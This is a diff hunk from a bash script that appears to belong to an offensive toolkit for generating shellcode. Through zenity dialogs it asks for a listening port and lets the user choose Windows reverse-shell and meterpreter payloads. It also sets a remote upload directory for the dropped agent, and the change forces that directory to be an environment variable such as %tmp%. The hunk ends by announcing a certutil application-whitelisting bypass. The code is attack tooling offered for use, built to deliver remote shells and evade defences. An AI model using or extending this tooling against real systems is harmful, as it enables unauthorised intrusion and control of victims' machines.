@@ -10012,11 +10012,20 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
 # input payload name
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-# input payload remote upload directory
-D1r=$(zenity --title="☠ Enter remote upload dir ☠" --text "The remote directory where to upload agente.\n\nexample: %tmp%" --entry --width 330) > /dev/null 2>&1
+# input payload (agent) remote upload directory
+D1r=$(zenity --title="☠ Enter remote upload dir ☠" --text "The remote directory where to upload agente.\nWARNING:Use only Windows Enviroment Variables\n\nexample: %tmp%" --entry --width 330) > /dev/null 2>&1
 
-
-
+#
+# check if remote path was inputed correctlly (only enviroment variables accepted)
+#
+chec=`echo "$D1r" | grep "%"`
+# verify if '$chec' local var contains the '%' string (enviroment variables)
+if [ -z "$chec" ]; then
+  echo "[x] WARNING: remote directory not supported .."
+  echo "[✔] Setting remote upload directory to: %tmp%"
+  D1r="%tmp%"
+  sleep 2
+fi
 
 
 echo "[☠] Loading certutil appl_whitelisting_bypass"
